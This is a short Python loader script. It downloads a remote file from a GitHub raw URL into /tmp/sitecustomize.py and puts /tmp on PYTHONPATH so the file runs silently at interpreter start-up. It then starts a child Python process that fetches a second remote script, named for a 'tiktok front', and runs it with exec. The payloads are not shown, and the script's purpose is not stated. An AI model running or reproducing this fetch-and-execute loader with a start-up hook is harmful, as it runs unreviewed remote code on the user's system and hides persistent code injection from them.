import os
import subprocess
import sys
import urllib.request

print("ND_RUNTIME_RESILIENCE_ENTRY_V7", flush=True)
urllib.request.urlretrieve("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/886009a65e233d6dd314a540d30e56afeddf97a9/tmp/nd_runtime_resilience_sitecustomize_v5.py", "/tmp/sitecustomize.py")
env = dict(os.environ)
env["PYTHONPATH"] = "/tmp" + ((":" + env["PYTHONPATH"]) if env.get("PYTHONPATH") else "")
child_code = """import urllib.request
src = urllib.request.urlopen("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/2701b7887aec4524b81dd827cce3695795de3aff/tmp/nd_tiktok_front_v01.py", timeout=30).read().decode("utf-8")
exec(compile(src, "nd_tiktok_front_v01.py", "exec"))
"""
raise SystemExit(subprocess.call([sys.executable, "-u", "-c", child_code], env=env))
